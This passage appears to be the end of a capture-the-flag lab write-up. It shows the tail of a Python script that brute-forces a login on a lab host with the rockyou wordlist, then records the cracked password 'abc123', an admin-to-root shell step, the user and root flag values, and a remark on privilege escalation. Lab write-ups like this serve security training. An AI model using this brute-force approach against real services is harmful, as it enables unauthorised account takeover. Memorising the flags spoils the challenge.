                        print(f"\n[+] CRACKED: {password}");sys.exit(0)
                    cS.close()
                except Exception: continue
    except FileNotFoundError: print("[-] Wordlist not found.")

if __name__ == "__main__": pwn("10.67.130.81", 8000, "/home/jackalsyn/opt/SecLists/Passwords/Leaked-Databases/rockyou-70.txt")
```
8. Crack the password `abc123`
9. `admin->abc123->shell` to root.

# Flags
Flag user.txt: `996bdb1f619a68361417cabca5454705`
Flag root.txt: `ba5ed03e9e74bb98054438480165e221`

# Notes:

During the test, the intial flaw could escalate to root without the added `needle` for the `think` user. 
